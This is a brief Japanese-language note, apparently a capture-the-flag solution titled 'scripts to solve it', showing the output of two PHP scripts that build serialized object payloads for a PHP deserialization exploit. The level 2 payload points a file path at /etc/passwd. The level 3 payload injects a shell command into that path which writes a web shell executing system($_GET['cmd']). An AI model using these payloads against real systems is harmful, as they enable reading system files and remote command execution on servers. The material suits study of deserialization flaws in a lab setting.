# 解くためのスクリプト

```
$ php level2-payload.php
O:4:"Main":1:{s:4:"file";O:7:"Setting":1:{s:4:"path";s:11:"/etc/passwd";}}
...
```

```
$ php level3-payload.php 
O:4:"Main":1:{s:4:"file";O:7:"Setting":1:{s:4:"path";s:57:"config.json; echo '<?php system($_GET["cmd"]);?>' > a.php";}}
...
```